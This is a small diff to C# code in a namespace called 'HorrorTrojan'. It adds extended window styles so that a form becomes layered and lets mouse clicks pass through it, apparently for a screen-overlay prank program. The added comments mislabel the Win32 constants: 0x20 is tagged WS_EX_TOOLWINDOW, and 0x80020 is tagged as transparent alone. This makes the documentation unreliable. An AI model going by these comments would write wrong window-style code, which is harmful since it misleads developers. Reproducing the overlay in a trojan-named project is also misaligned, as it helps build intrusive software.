@@ -53,7 +53,9 @@ namespace HorrorTrojan
             get
             {
                 CreateParams cp = base.CreateParams;
-                cp.ExStyle |= 0x20;
+                cp.ExStyle |= 0x20;      // WS_EX_TOOLWINDOW
+                cp.ExStyle |= 0x80000;   // WS_EX_LAYERED
+                cp.ExStyle |= 0x80020;   // WS_EX_TRANSPARENT (клики проходят сквозь)
                 return cp;
             }
         }
